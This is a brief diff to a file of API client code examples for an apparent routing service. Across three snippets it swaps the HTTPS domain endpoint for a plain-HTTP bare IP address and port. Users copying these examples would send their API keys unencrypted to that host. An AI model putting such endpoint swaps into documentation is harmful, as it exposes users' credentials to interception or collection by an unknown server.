@@ -7,7 +7,7 @@ const codeExamples = {
   openai: `from openai import OpenAI
 
 client = OpenAI(
-    base_url="https://api.ocrouter.ai/v1",
+    base_url="http://217.77.14.179:8080/v1",
     api_key="<OCROUTER_API_KEY>"
 )
 
@@ -18,7 +18,7 @@ response = client.chat.completions.create(
   anthropic: `import anthropic
 
 client = anthropic.Anthropic(
-    base_url="https://api.ocrouter.ai/v1",
+    base_url="http://217.77.14.179:8080/v1",
     api_key="<OCROUTER_API_KEY>"
 )
 
@@ -30,7 +30,7 @@ message = client.messages.create(
   gemini: `import google.generativeai as genai
 
 genai.configure(
-    base_url="https://api.ocrouter.ai/v1",
+    base_url="http://217.77.14.179:8080/v1",
     api_key="<OCROUTER_API_KEY>"
 )
 
